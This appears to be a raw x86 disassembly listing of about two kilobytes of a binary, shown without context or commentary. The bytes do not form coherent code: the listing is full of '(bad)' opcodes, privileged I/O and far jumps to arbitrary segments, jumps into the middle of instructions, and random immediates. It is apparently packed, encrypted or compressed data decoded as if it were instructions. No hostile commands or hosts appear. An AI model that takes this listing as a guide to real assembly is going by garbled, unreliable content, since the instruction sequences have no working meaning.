  4122a1:	out    0xb,al
  4122a3:	push   ebx
  4122a4:	loop   0x412314
  4122a6:	and    DWORD PTR [esi-0x3c],esi
  4122a9:	adc    DWORD PTR ds:0x13411121,eax
  4122af:	sti    
  4122b0:	mov    cs,WORD PTR [edi]
  4122b2:	fldenv [edx+0x9]
  4122b5:	sub    DWORD PTR [ebx-0x7768ad22],esi
  4122bb:	mov    bh,0x14
  4122bd:	push   ds
  4122be:	lds    ebx,FWORD PTR [ecx]
  4122c0:	stos   BYTE PTR es:[edi],al
  4122c1:	sbb    al,0x93
  4122c3:	add    BYTE PTR [edx+0x23270543],ah
  4122c9:	lahf   
  4122ca:	or     BYTE PTR [eax+0x35],0x22
  4122ce:	add    al,0x25
  4122d0:	out    0x21,eax
  4122d2:	and    al,BYTE PTR [edx-0x7c]
  4122d5:	mov    ?,WORD PTR [edx+esi*2]
  4122d8:	imul   edi,DWORD PTR [edi+0x40cccbce],0x7ce9ea03
  4122e2:	xchg   ecx,eax
  4122e3:	jne    0x412337
  4122e5:	imul   ebx,DWORD PTR [ebp+0x70b88589],0x405e4a4b
  4122ef:	pop    edi
  4122f0:	push   0x61
  4122f2:	and    dh,dl
  4122f4:	cld    
  4122f5:	repz inc edi
  4122f7:	icebp  
  4122f8:	rcl    BYTE PTR [esi],1
  4122fa:	mov    ecx,0x2004a37f
  4122ff:	push   es
  412300:	push   0xffffff94
  412302:	addr16 inc edx
  412304:	ins    BYTE PTR es:[edi],dx
  412305:	sub    BYTE PTR [eax-0x20],bl
  412308:	(bad)  
  412309:	lods   eax,DWORD PTR ds:[esi]
  41230a:	and    al,0xbe
  41230c:	fs ins BYTE PTR es:[edi],dx
  41230e:	mov    dh,BYTE PTR [ebx+0x3a1b5804]
  412314:	add    BYTE PTR [esp+ebp*2+0x7a],bh
  412318:	adc    al,0x2b
  41231a:	ret    0xf2a6
  41231d:	xor    al,0xbd
  41231f:	scas   eax,DWORD PTR es:[edi]
  412320:	add    al,0x3
  412322:	shr    DWORD PTR [edx-0x79],1
  412325:	retf   
  412326:	outs   dx,BYTE PTR ds:[esi]
  412327:	nop
  412328:	in     eax,0xc5
  41232a:	cmc    
  41232b:	daa    
  41232c:	jo     0x41238d
  41232e:	pop    es
  41232f:	fbstp  TBYTE PTR [ecx+0x14]
  412332:	leave  
  412333:	mov    bh,0xad
  412335:	call   0xc2c8:0x4fa065ac
  41233c:	inc    edi
  41233d:	stos   BYTE PTR es:[edi],al
  41233e:	retf   
  41233f:	(bad)  
  412340:	push   ds
  412341:	or     ebp,DWORD PTR [ecx]
  412343:	jp     0x41235f
  412345:	aam    0x8d
  412347:	mov    dh,0xd6
  412349:	and    eax,0x58add319
  41234e:	jmp    0xedac05de
  412353:	int    0xa9
  412355:	inc    edx
  412356:	sub    ch,BYTE PTR [edx+0x377f60f3]
  41235c:	jb     0x4123b0
  41235e:	or     BYTE PTR [eax-0x68091bdb],dl
  412364:	or     al,0x8e
  412366:	mov    ah,0xe8
  412368:	mov    ?,WORD PTR [edx+0x15]
  41236b:	pop    edx
  41236c:	fstp   DWORD PTR [eax+edi*4]
  41236f:	xor    bh,ch
  412371:	arpl   bx,sp
  412373:	pop    ecx
  412374:	jo     0x4123d0
  412376:	adc    BYTE PTR [eax],dh
  412378:	arpl   WORD PTR [esi+0x70],ax
  41237b:	std    
  41237c:	(bad)  
  41237e:	test   eax,0xbe17f1ca
  412383:	int    0xbc
  412385:	in     al,dx
  412386:	fwait
  412387:	test   BYTE PTR [ecx-0xa889b00],dl
  41238d:	dec    eax
  41238e:	inc    ebp
  41238f:	out    0x75,al
  412391:	lods   al,BYTE PTR ds:[esi]
  412392:	or     al,0x4f
  412394:	retf   0x810a
  412397:	add    ecx,ecx
  412399:	mov    ah,0x9a
  41239b:	sub    al,0x10
  41239d:	sbb    BYTE PTR [ecx+ebp*8-0x45f80d6f],bh
  4123a4:	mov    eax,ds:0x77bf528f
  4123a9:	cs test al,0x10
  4123ac:	push   ecx
  4123ad:	mov    dl,dl
  4123af:	shl    ebx,0xa3
  4123b2:	xchg   ebp,eax
  4123b3:	add    BYTE PTR [esp+eiz*8+0x3ebb9af],0x93
  4123bb:	jge    0x412420
  4123bd:	lds    edx,FWORD PTR [edi-0x35]
  4123c0:	and    ebx,DWORD PTR [ebx]
  4123c2:	dec    ecx
  4123c3:	jns    0x4123e5
  4123c5:	xor    al,0xd1
  4123c7:	rol    BYTE PTR [ebp-0x25],1
  4123ca:	dec    ecx
  4123cb:	scas   al,BYTE PTR es:[edi]
  4123cc:	xor    ah,0x70
  4123cf:	aaa    
  4123d0:	dec    edi
  4123d1:	pop    eax
  4123d2:	scas   eax,DWORD PTR es:[edi]
  4123d3:	out    dx,eax
  4123d4:	das    
  4123d5:	mov    ds:0xdc68c489,eax
  4123da:	pop    edx
  4123db:	adc    ebp,ebx
  4123dd:	and    BYTE PTR [edx],cl
  4123df:	dec    ebp
  4123e0:	(bad)  
  4123e1:	jmp    0x412461
  4123e3:	out    dx,al
  4123e4:	retf   
  4123e5:	dec    edx
  4123e6:	sbb    DWORD PTR [edx-0x57],ebp
  4123e9:	iret   
  4123ea:	mov    ebp,0x67db924a
  4123ef:	inc    ecx
  4123f0:	scas   al,BYTE PTR es:[edi]
  4123f1:	mov    ah,0xe5
  4123f3:	jae    0x412472
  4123f5:	or     DWORD PTR [ecx-0x28],edx
  4123f8:	xor    BYTE PTR [esi-0x4d966635],0xd6
  4123ff:	cmc    
  412400:	and    al,0x2a
  412402:	ins    DWORD PTR es:[edi],dx
  412403:	jg     0x41245e
  412405:	imul   ecx,esi,0xbc724090
  41240b:	xchg   ecx,eax
  41240c:	push   edx
  41240d:	lahf   
  41240e:	dec    edx
  41240f:	sub    ebp,esi
  412411:	inc    edi
  412412:	sub    esp,DWORD PTR [edi]
  412414:	call   0xc47c:0xe9dd4276
  41241b:	(bad)  
  41241c:	jmp    0x75d5f3ca
  412421:	pop    esp
  412422:	pop    ebp
  412423:	shl    cl,0xe0
  412426:	(bad)  
  412427:	jl     0x412454
  412429:	inc    esp
  41242a:	xchg   ebx,eax
  41242b:	(bad)  
  41242c:	push   cs
  41242d:	and    DWORD PTR [ecx+0x43],ecx
  412430:	cld    
  412431:	in     eax,dx
  412432:	push   ebp
  412433:	pop    eax
  412434:	jp     0x4123bd
  412436:	test   BYTE PTR [ebp+0x2602ba3b],dh
  41243c:	xchg   edi,eax
  41243d:	push   edx
  41243e:	cmp    BYTE PTR [edx-0x1abdc773],ah
  412444:	pop    esp
  412445:	jae    0x41245c
  412447:	(bad)  
  412449:	lea    eax,[esi+ebx*4+0x1891bdc1]
  412450:	mov    ss,WORD PTR [ebp-0x21]
  412453:	mov    BYTE PTR [edi-0x73],cl
  412456:	jle    0x41243e
  412458:	lea    ebp,[ebp+0x38e42432]
  41245e:	aam    0x36
  412460:	or     BYTE PTR [edx-0x9],bl
  412463:	bound  ecx,QWORD PTR [edx-0x5d]
  412466:	js     0x4123ed
  412468:	ja     0x4124dc
  41246a:	mov    al,0xa5
  41246c:	push   edx
  41246d:	cmc    
  41246e:	jnp    0x412414
  412470:	je     0x412455
  412472:	call   0x76946c26
  412477:	xor    eax,0xf9cbb1e9
  41247c:	std    
  41247d:	pop    edx
  41247e:	outs   dx,BYTE PTR ds:[esi]
  41247f:	mov    bh,0x79
  412481:	lds    ecx,FWORD PTR [ecx+0x259f1b7d]
  412487:	jb     0x4124e1
  412489:	mov    ebx,0x2d7d1607
  41248e:	rol    DWORD PTR [ecx+0x6fae0204],0x6f
  412495:	pop    ss
  412496:	fstp   DWORD PTR [edi+0x43]
  412499:	or     al,0x76
  41249b:	mov    ch,0x4f
  41249d:	mov    edi,0x865ef654
  4124a2:	xchg   edx,eax
  4124a3:	sbb    al,0x49
  4124a5:	sbb    eax,0x67504fd2
  4124aa:	lds    ecx,FWORD PTR [ebx+0x56]
  4124ad:	jp     0x412512
  4124af:	sub    dh,BYTE PTR [esi+ebp*2-0x52b5198d]
  4124b6:	inc    edi
  4124b7:	mov    ebx,0x639d30a4
  4124bc:	shr    ah,1
  4124be:	pop    edx
  4124bf:	cld    
  4124c0:	fld    DWORD PTR [ebx+edx*2]
  4124c3:	std    
  4124c4:	test   DWORD PTR [eax-0x4c39091f],0xb8e83217
  4124ce:	xor    DWORD PTR [esi],esp
  4124d0:	mov    ch,0x17
  4124d2:	mov    eax,ebp
  4124d4:	data16 lahf 
  4124d6:	mov    ecx,DWORD PTR [ecx]
  4124d8:	pop    ds
  4124d9:	test   al,0x94
  4124db:	adc    ebp,ecx
  4124dd:	jae    0x412501
  4124df:	pusha  
  4124e0:	cmc    
  4124e1:	stos   DWORD PTR es:[edi],eax
  4124e2:	or     ah,bh
  4124e4:	cs pop edi
  4124e6:	xchg   ebx,eax
  4124e7:	imul   ebp,DWORD PTR [esi],0xffffff80
  4124ea:	dec    eax
  4124eb:	cmp    edx,ebx
  4124ed:	ficomp DWORD PTR [edi+edx*4]
  4124f0:	iret   
  4124f1:	push   es
  4124f2:	in     eax,0xe5
  4124f4:	std    
  4124f5:	jp     0x412567
  4124f7:	fbstp  TBYTE PTR [eax]
  4124f9:	ror    DWORD PTR [edi],1
  4124fb:	lods   al,BYTE PTR ds:[esi]
  4124fc:	jmp    0xbda7:0x5d37959
  412503:	sbb    eax,0x7c62dfab
  412508:	fwait
  412509:	adc    ah,ch
  41250b:	push   eax
  41250c:	(bad)  
  41250d:	mov    cl,0x55
  41250f:	in     al,dx
  412510:	mov    ch,0x3a
  412512:	mov    DWORD PTR [edi-0x21527932],esp
  412518:	test   eax,0xde223b44
  41251d:	popf   
  41251e:	cdq    
  41251f:	push   edi
  412520:	mov    edi,0xb38b98c
  412525:	mov    esi,0x2ffdcf52
  41252a:	daa    
  41252b:	out    0x15,al
  41252d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41252e:	jl     0x4125a5
  412530:	xchg   ebx,eax
  412531:	pushf  
  412532:	int3   
  412533:	xor    eax,0xb88190d7
  412538:	dec    ebp
  412539:	sahf   
  41253a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41253b:	pop    esi
  41253c:	shl    DWORD PTR [ecx-0x19],0x6e
  412540:	dec    ebp
  412541:	pop    ebx
  412542:	add    al,0xad
  412544:	shl    BYTE PTR [ebp+0x327140af],cl
  41254a:	and    DWORD PTR [eax+0x790f4d8f],ecx
  412550:	or     bl,al
  412552:	sbb    BYTE PTR [ebx+0x1e],cl
  412555:	popa   
  412556:	fwait
  412557:	out    dx,al
  412558:	mov    ds:0x7f0a8c87,eax
  41255d:	mov    al,ds:0xed5dc6cb
  412562:	jp     0x412584
  412564:	mov    dh,0x39
  412566:	adc    eax,0x17c7bf64
  41256b:	inc    esp
  41256c:	mov    DWORD PTR [esi],ebx
  41256e:	adc    al,0xe7
  412570:	jno    0x412522
  412572:	loope  0x4125d7
  412574:	fisub  DWORD PTR [ecx+0x22]
  412577:	push   ds
  412578:	fist   DWORD PTR [ecx-0x3d]
  41257b:	push   esp
  41257d:	popa   
  41257e:	adc    DWORD PTR [ebx+0x46],ebx
  412581:	shr    DWORD PTR [ebp-0x17244231],0xf4
  412588:	jle    0x412540
  41258a:	out    0xbb,al
  41258c:	add    ecx,DWORD PTR [esi]
  41258e:	pop    ecx
  41258f:	lods   al,BYTE PTR ds:[esi]
  412590:	ins    DWORD PTR es:[edi],dx
  412591:	mov    DWORD PTR [eax],esi
  412593:	add    ah,BYTE PTR cs:[ecx+0x2e464620]
  41259a:	shr    DWORD PTR [ecx],1
  41259c:	nop
  41259d:	jns    0x412575
  41259f:	retf   
  4125a0:	jmp    0x4155:0xaef068dc
  4125a7:	or     al,0xf3
  4125a9:	in     al,dx
  4125aa:	mov    edx,0xcbc58b70
  4125af:	fld    DWORD PTR [esi+esi*8+0x67]
  4125b3:	push   0x2d
  4125b5:	add    al,0xb1
  4125b7:	mov    DWORD PTR [eax+0x150fed0e],esi
  4125bd:	xor    DWORD PTR [ecx],0xffffffe6
  4125c0:	cmp    esi,edx
  4125c2:	jns    0x41260c
  4125c4:	jne    0x4125bb
  4125c6:	shl    DWORD PTR [ecx],1
  4125c8:	es push esi
  4125ca:	fld    TBYTE PTR [ebx+0x2]
  4125cd:	lds    esp,FWORD PTR [ebx-0x45]
  4125d0:	cmp    ecx,DWORD PTR [esi]
  4125d2:	into   
  4125d3:	pop    ss
  4125d4:	cmc    
  4125d5:	push   ebp
  4125d6:	xor    eax,DWORD PTR [ecx]
  4125d8:	push   0x16afc333
  4125dd:	retf   0x1320
  4125e0:	into   
  4125e1:	dec    esp
  4125e2:	outs   dx,BYTE PTR ds:[esi]
  4125e3:	jno    0x412655
  4125e5:	add    bl,BYTE PTR [edx-0x3b]
  4125e8:	xor    BYTE PTR [ebp-0x29],al
  4125eb:	mov    al,ds:0xd4665975
  4125f0:	repz dec esi
  4125f2:	shl    dh,0xde
  4125f5:	mov    eax,ds:0x4ca6c0ea
  4125fa:	adc    eax,0x11c983f
  4125ff:	cdq    
  412600:	inc    ebp
  412601:	in     eax,dx
  412602:	test   eax,0xc80ed6b7
  412607:	inc    edx
  412608:	mov    al,ds:0xf0a93f20
  41260d:	dec    ecx
  41260e:	or     al,0xcd
  412610:	dec    ecx
  412611:	xlat   BYTE PTR ds:[ebx]
  412612:	pop    ebx
  412613:	fstp   DWORD PTR [esi-0x16]
  412616:	xchg   DWORD PTR [eax+esi*4-0x4c67e596],edi
  41261d:	push   ebp
  41261e:	aaa    
  41261f:	jne    0x4125a3
  412621:	in     al,0x4a
  412623:	add    al,0x76
  412625:	sbb    al,0xb9
  412627:	call   0xc10:0xb16434a3
  41262e:	inc    esi
  41262f:	enter  0x76b7,0x47
  412633:	js     0x4126b0
  412635:	jne    0x4125f6
  412637:	je     0x412686
  412639:	mov    ds:0x84489b0d,eax
  41263e:	scas   eax,DWORD PTR es:[edi]
  41263f:	xor    ebx,edx
  412641:	and    eax,DWORD PTR [edi-0x45251650]
  412647:	mov    ebx,esp
  412649:	mov    ebx,0xb2655ddd
  41264e:	sub    eax,0x6027148f
  412653:	mov    eax,DWORD PTR [eax+0xd]
  412656:	jno    0x412642
  412658:	or     eax,0x88a1dd08
  41265d:	cmp    BYTE PTR [esi-0x44347053],bl
  412663:	pop    eax
  412664:	mov    ecx,0x4845fd60
  412669:	add    DWORD PTR fs:[edx],eax
  41266c:	pop    ecx
  41266d:	sti    
  41266e:	out    dx,eax
  41266f:	jno    0x412664
  412671:	cli    
  412672:	dec    ebx
  412673:	pushf  
  412674:	in     eax,0xc2
  412676:	je     0x412643
  412678:	out    dx,eax
  412679:	xchg   edx,eax
  41267a:	addr16 repnz cld 
  41267d:	aad    0x28
  41267f:	dec    esi
  412680:	mov    ds:0x95424b70,al
  412685:	cwde   
  412686:	adc    DWORD PTR [ecx-0x24],edx
  412689:	add    eax,0xf0f09b56
  41268e:	les    eax,FWORD PTR [ebx-0x4b]
  412691:	and    bh,BYTE PTR [eax-0x5]
  412694:	pop    esp
  412695:	ja     0x412653
  412697:	es pop ebp
  412699:	pop    ebp
  41269a:	sbb    DWORD PTR [ebx],eax
  41269c:	pop    ds
  41269d:	inc    sp
  41269f:	or     BYTE PTR [esi+ebx*2],0x73
  4126a3:	and    BYTE PTR [edi-0x38299068],dh
  4126a9:	mov    ebx,0x3ae51676
  4126ae:	and    al,0xfd
  4126b0:	xchg   edi,eax
  4126b1:	ret    
  4126b2:	outs   dx,DWORD PTR ds:[esi]
  4126b3:	scas   eax,DWORD PTR es:[edi]
  4126b4:	retf   0x6e8
  4126b7:	fdivr  st,st(3)
  4126b9:	add    BYTE PTR [esi+edx*1+0x238e7cef],dl
  4126c0:	and    ah,dl
  4126c2:	jbe    0x4126a0
  4126c4:	stos   BYTE PTR es:[edi],al
  4126c5:	inc    edx
  4126c6:	and    BYTE PTR [edx],0xb5
  4126c9:	das    
  4126ca:	push   ebx
  4126cb:	inc    edi
  4126cc:	adc    BYTE PTR [esi-0x72762253],0xc1
  4126d3:	rol    DWORD PTR [edi-0x38],0x5e
  4126d7:	hlt    
  4126d8:	lods   al,BYTE PTR ds:[esi]
  4126d9:	aad    0xe9
  4126db:	mov    DWORD PTR [esi],edi
  4126dd:	jl     0x41271d
  4126df:	jge    0x4126af
  4126e1:	and    ebp,ebx
  4126e3:	jb     0x4126d2
  4126e5:	out    dx,eax
  4126e6:	mov    ebp,0x4b58fea0
  4126eb:	sbb    BYTE PTR [ecx+ebp*2+0x3ef4eb12],ah
  4126f2:	cmp    bl,cl
  4126f4:	pushf  
  4126f5:	xchg   ecx,eax
  4126f6:	inc    esi
  4126f7:	mov    al,ds:0xf1e4aac0
  4126fc:	je     0x41268f
  4126fe:	and    al,BYTE PTR [ebx-0x364664fc]
  412704:	inc    edi
  412705:	cld    
  412706:	sti    
  412707:	sar    DWORD PTR [ebp+0x44],cl
  41270a:	(bad)  
  41270b:	jno    0x4126c0
  41270d:	dec    ebp
  41270e:	movaps xmm5,XMMWORD PTR [eax+edi*2]
  412712:	test   DWORD PTR [edx+ebx*1-0x63],ebx
  412716:	aaa    
  412717:	pop    ecx
  412718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412719:	mov    esi,0xf661b92d
  41271e:	pop    ebp
  41271f:	sbb    ebp,esp
  412721:	lahf   
  412722:	xchg   BYTE PTR ds:0x42fbbb3a,ah
  412728:	clc    
  412729:	scas   eax,DWORD PTR es:[edi]
  41272a:	xor    ecx,DWORD PTR [esi+0x748670c]
  412730:	push   esi
  412731:	push   edi
  412732:	push   ebp
  412733:	pushf  
  412734:	dec    edi
  412735:	int    0x0
  412737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412738:	ds pop ss
  41273a:	push   edi
  41273b:	mov    bh,0xe6
  41273d:	mov    ds:0xa1bfa4ee,al
  412742:	xor    BYTE PTR [edx+0x66],bl
  412745:	cwde   
  412746:	inc    esi
  412747:	push   ebp
  412748:	adc    esp,edi
  41274a:	cld    
  41274b:	mov    bl,ch
  41274d:	pop    ebp
  41274e:	pusha  
  41274f:	or     edi,edx
  412751:	cmpxchg BYTE PTR [esi-0x7],al
  412755:	or     DWORD PTR [edx+0x4c8c5cbc],0x2ea31a80
  41275f:	sub    BYTE PTR ds:0x63625d3,0xa
  412766:	and    ecx,0xffffff8a
  412769:	sub    eax,0x5b6960b3
  41276e:	sub    eax,0xfea9718b
  412773:	les    esi,FWORD PTR [edx-0x21f135b8]
  412779:	cwde   
  41277a:	mul    DWORD PTR [esi+0x1e]
  41277d:	cli    
  41277e:	inc    edi
  41277f:	mov    BYTE PTR [edi+0x5f],ah
  412782:	les    ebp,FWORD PTR ds:0x5c0fd43
  412788:	or     BYTE PTR [edx-0x442b6d8d],0xb6
  41278f:	fmul   QWORD PTR [eax+0x2b]
  412792:	cli    
  412793:	std    
  412794:	(bad)  
  412796:	rol    BYTE PTR ds:0xa30b5fe1,1
  41279c:	xor    ah,dl
  41279e:	aam    0x5a
  4127a0:	inc    ecx
  4127a1:	adc    al,0x76
  4127a3:	test   eax,0xd59b7666
  4127a8:	dec    edi
  4127a9:	aad    0x65
  4127ab:	call   FWORD PTR ds:[eax+0x1b64c98d]
  4127b2:	dec    edi
  4127b3:	xor    eax,0x14b858f1
  4127b8:	sub    DWORD PTR [edx+0x4c],edi
  4127bb:	jbe    0x4127ac
  4127bd:	popa   
  4127be:	cld    
  4127bf:	xchg   BYTE PTR [edi+eiz*1-0x58da9616],cl
  4127c6:	lock addr16 and al,0x48
  4127ca:	je     0x412808
  4127cc:	dec    ebx
  4127cd:	mov    cl,0x5
  4127cf:	push   eax
  4127d0:	push   ebx
  4127d1:	icebp  
  4127d2:	sub    al,BYTE PTR [ecx+0x4b4dc569]
  4127d8:	mov    ebp,0xd3c7a455
  4127dd:	mov    al,ds:0x4a01fd4d
  4127e2:	adc    DWORD PTR [esp+eax*4],0xa69c646d
  4127e9:	rcr    BYTE PTR [ecx],cl
  4127eb:	adc    DWORD PTR [ebx+0x3b970f96],ebp
  4127f1:	push   esi
  4127f2:	scas   al,BYTE PTR es:[edi]
  4127f3:	mov    esp,0xca0e8f58
  4127f8:	xor    eax,DWORD PTR [bp+0x5c46]
  4127fd:	mov    ecx,DWORD PTR ds:0x8a1db374
  412803:	mov    eax,ds:0xb2eca0d1
  412808:	push   ds
  412809:	inc    ebp
  41280a:	call   DWORD PTR [ecx]
  41280c:	mov    eax,ds:0x60c9af55
  412811:	js     0x4127e6
  412813:	pop    ecx
  412814:	xor    DWORD PTR [ecx],ebx
  412816:	mov    ecx,0x7dab2e2a
  41281b:	pusha  
  41281c:	or     al,0xae
  41281e:	pop    ebp
  41281f:	jecxz  0x4127c1
  412821:	(bad)  
  412822:	pop    eax
  412823:	add    BYTE PTR [edx],bh
  412825:	loopne 0x4128a1
  412827:	xchg   BYTE PTR ds:0x1fd2ca46,al
  41282d:	mov    ds:0x57802e2d,eax
  412832:	pusha  
  412833:	mov    al,ds:0xadda1adf
  412838:	add    al,0x41
  41283a:	xchg   ebx,eax
  41283b:	lods   al,BYTE PTR ds:[esi]
  41283c:	xor    dl,BYTE PTR [edx-0x3066f7a3]
  412842:	in     al,0xca
  412844:	mov    eax,DWORD PTR [edi]
  412846:	inc    esi
  412847:	inc    ecx
  412848:	mov    esp,0x23fe8b20
  41284d:	inc    ebx
  41284e:	and    edx,eax
  412850:	ds cs in al,0x8f
  412854:	and    al,0xde
  412856:	xor    eax,0x59712b83
  41285b:	mov    al,ds:0x8dea6b9a
  412860:	add    eax,0x8bfb836a
  412865:	bound  edi,QWORD PTR [edi+eax*1]
  412868:	rcr    BYTE PTR [eax],cl
  41286a:	inc    ebp
  41286b:	xor    cl,BYTE PTR ds:0xbfc29f06
  412871:	(bad)  
  412872:	ffree  st(5)
  412874:	or     DWORD PTR [eax-0x40712e6c],edi
  41287a:	jno    0x4128b6
  41287c:	adc    eax,DWORD PTR [esi]
  41287e:	mov    edx,0xa7fcc5e1
  412883:	xchg   esp,eax
  412884:	std    
  412885:	xchg   ebp,eax
  412886:	les    edi,FWORD PTR [esi+ebp*8]
  412889:	or     cl,BYTE PTR [ebp+0x7b]
  41288c:	clc    
  41288d:	sub    dl,BYTE PTR [eax]
  41288f:	jmp    0x8684:0x467f5697
  412896:	push   ss
  412897:	or     DWORD PTR [ecx+ebp*2],esi
  41289a:	cmp    ebx,DWORD PTR [eiz*2+0x4b03ef0d]
  4128a1:	popa   
  4128a2:	aaa    
  4128a3:	test   al,0xad
  4128a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128a6:	adc    bh,BYTE PTR ds:0xa6ff95e1
  4128ac:	and    eax,0xfc30b41b
  4128b1:	fmul   st,st(2)
  4128b3:	loope  0x412890
  4128b5:	push   esp
  4128b6:	(bad)  [eax+0x61]
  4128b9:	(bad)  
  4128ba:	icebp  
  4128bb:	aas    
  4128bc:	cld    
  4128bd:	dec    ebp
  4128be:	sub    bl,ah
  4128c0:	adc    al,0xef
  4128c2:	pushf  
  4128c3:	popf   
  4128c4:	sub    dh,ch
  4128c6:	shl    edi,0xa4
  4128c9:	inc    esi
  4128ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128cb:	(bad)  
  4128cc:	pop    esp
  4128cd:	xchg   ecx,eax
  4128ce:	aaa    
  4128cf:	mov    dl,0x5f
  4128d1:	push   ss
  4128d2:	cmp    dl,BYTE PTR [ebx-0x61]
  4128d5:	loope  0x4128a5
  4128d7:	push   edx
  4128d8:	mov    bh,0xb2
  4128da:	ret    
  4128db:	add    edi,DWORD PTR [ebx+0x47]
  4128de:	push   ebx
  4128df:	(bad)
  4128e2:	(bad)  
  4128e4:	lahf   
  4128e5:	cmc    
  4128e6:	in     eax,0x20
  4128e8:	sbb    al,0x6c
  4128ea:	mov    ds:0x908b4197,eax
  4128ef:	mov    eax,0xb9e33862
  4128f4:	(bad)  
  4128f5:	(bad)  
  4128f6:	out    0x91,eax
  4128f8:	sbb    bl,BYTE PTR [edi]
  4128fa:	add    edi,ecx
  4128fc:	imul   DWORD PTR [ebx]
  4128fe:	pop    edx
  4128ff:	pop    ebx
  412900:	cmc    
  412901:	sbb    DWORD PTR [eax+0x54871633],0x42
  412908:	fstp   TBYTE PTR [ebx]
  41290a:	adc    ah,dl
  41290c:	fs and al,0x63
  41290f:	stos   BYTE PTR es:[edi],al
  412910:	dec    ebp
  412911:	pop    ebp
  412912:	mov    DWORD PTR [eax-0x5f],eax
  412915:	inc    edx
  412916:	pop    ds
  412917:	popf   
  412918:	shr    BYTE PTR [ebp-0x705bf629],0x65
  41291f:	jg     0x41290c
  412921:	pop    eax
  412922:	arpl   WORD PTR gs:[edx+0x53],si
  412926:	mov    dl,0x98
  412928:	xor    al,0xbe
  41292a:	mov    eax,0x86b8df7a
  41292f:	adc    dl,dh
  412931:	je     0x41291a
  412933:	lahf   
  412934:	or     al,0xea
  412936:	cdq    
  412937:	pop    esp
  412938:	sbb    BYTE PTR [ecx-0x5a94c76d],0x4a
  41293f:	ffree  st(0)
  412941:	adc    edx,eax
  412943:	mov    edi,0xa36f910a
  412948:	shl    BYTE PTR [edx-0xe],0xfd
  41294c:	mov    al,0x7e
  41294e:	mov    ecx,0x24c880f6
  412953:	add    cl,BYTE PTR [edi]
  412955:	shr    DWORD PTR [esi-0x51],0x51
  412959:	sti    
  41295a:	sbb    al,0xba
  41295c:	xchg   BYTE PTR [ebx+0x613deac7],al
  412962:	adc    ch,BYTE PTR [esi+0x3c]
  412965:	fimul  WORD PTR [edi+0x12]
  412968:	fisttp DWORD PTR [esi]
  41296a:	in     al,0x38
  41296c:	push   esp
  41296d:	aaa    
  41296e:	stos   DWORD PTR es:[edi],eax
  41296f:	sbb    cl,BYTE PTR [esi+esi*2+0x2962f5cd]
  412976:	inc    ebx
  412977:	mov    esi,DWORD PTR [edx+0x1d]
  41297a:	es inc ebp
  41297c:	ror    DWORD PTR [ebp-0x4d],0x27
  412980:	pop    ds
  412981:	stc    
  412982:	xor    al,BYTE PTR ds:0x7eb241cd
  412988:	mov    dh,0xa1
  41298a:	sub    BYTE PTR [edx],bh
  41298c:	sbb    bl,BYTE PTR [edi+0x79b05175]
  412992:	add    BYTE PTR [ecx+eax*2],ah
  412995:	pusha  
  412996:	(bad)  
  412997:	xor    al,0xbe
  412999:	add    eax,0xf08128ce
  41299e:	fcmovb st,st(7)
  4129a0:	(bad)  
  4129a1:	lock or al,bh
  4129a4:	adc    edx,edx
  4129a6:	xor    ch,dh
  4129a8:	retf   
  4129a9:	call   0xc2e02530
  4129ae:	enter  0xbc15,0x41
  4129b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129b3:	jle    0x4129df
  4129b5:	pop    ss
  4129b6:	pop    esi
  4129b7:	dec    eax
  4129b8:	loopne 0x41295c
  4129ba:	sub    BYTE PTR [ecx+0x5f909132],al
  4129c0:	cli    
  4129c1:	inc    eax
  4129c2:	jmp    0x4129f3
  4129c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c5:	lahf   
  4129c6:	push   edx
  4129c7:	pop    es
  4129c8:	dec    edi
  4129c9:	inc    ebx
  4129ca:	adc    al,0x3e
  4129cc:	inc    esi
  4129cd:	in     eax,dx
  4129ce:	inc    eax
  4129cf:	jmp    0x8418165c
  4129d4:	cmp    DWORD PTR [ecx+eax*8],0x52
  4129d8:	leave  
  4129d9:	(bad)  
  4129da:	fs push ebx
  4129dc:	jae    0x412a3f
  4129de:	aam    0x92
  4129e0:	stc    
  4129e1:	call   0x97eba8d4
  4129e6:	loop   0x4129b2
  4129e8:	dec    esp
  4129e9:	inc    ebx
  4129ea:	or     esp,edi
  4129ec:	mov    ds:0xb2777e25,al
  4129f1:	retf   0xbae6
  4129f4:	fidivr DWORD PTR [ecx+esi*2-0x791b6037]
  4129fb:	(bad)  
  4129fc:	ins    DWORD PTR es:[edi],dx
  4129fd:	or     dl,BYTE PTR [esp+eax*1]
  412a00:	ins    BYTE PTR es:[edi],dx
  412a01:	add    BYTE PTR [esi-0x74],bl
  412a04:	or     BYTE PTR [ebx-0x73],0x5b
  412a08:	stos   BYTE PTR es:[edi],al
  412a09:	(bad)  
  412a0a:	push   0xebc69b08
  412a0f:	ja     0x4129c5
  412a11:	ja     0x412a64
  412a13:	js     0x412a6f
  412a15:	call   0x92e709e6
  412a1a:	out    dx,eax
  412a1b:	dec    esi
  412a1c:	mov    esi,0x981e2f37
  412a21:	(bad)  
  412a22:	in     al,dx
  412a23:	sub    ch,bl
  412a25:	aad    0xd5
  412a27:	pop    ebp
  412a28:	test   DWORD PTR [eax],edx
  412a2a:	stos   BYTE PTR es:[edi],al
  412a2b:	pusha  
  412a2c:	addr16 mov esi,0xbef18a62
  412a32:	add    ecx,DWORD PTR [ebx]
  412a34:	sub    eax,0xd4af3cf3
  412a39:	sub    DWORD PTR [ecx],edx
  412a3b:	mov    bh,0x46
  412a3d:	(bad)  
  412a3e:	out    dx,eax
  412a3f:	pop    ebx
  412a40:	jno    0x412aa2
  412a42:	imul   di,WORD PTR [esi+0x46],0x6e2
  412a48:	into   
  412a49:	aaa    
  412a4a:	in     eax,dx
  412a4b:	push   0x9c365175
  412a50:	add    eax,0x980f680f
  412a55:	xor    al,0x1c
  412a57:	aam    0x56
  412a59:	jnp    0x412aa2
  412a5b:	or     bh,bh
  412a5d:	sbb    DWORD PTR [ecx-0xb5e5a06],ebp
  412a63:	pop    eax
  412a64:	fist   DWORD PTR [eax+0x439cf295]
  412a6a:	inc    ebp
  412a6b:	in     eax,dx
  412a6c:	data16 aam 0xfe
  412a6f:	or     eax,0x7c14edf4
  412a74:	stos   DWORD PTR es:[edi],eax
  412a75:	into   
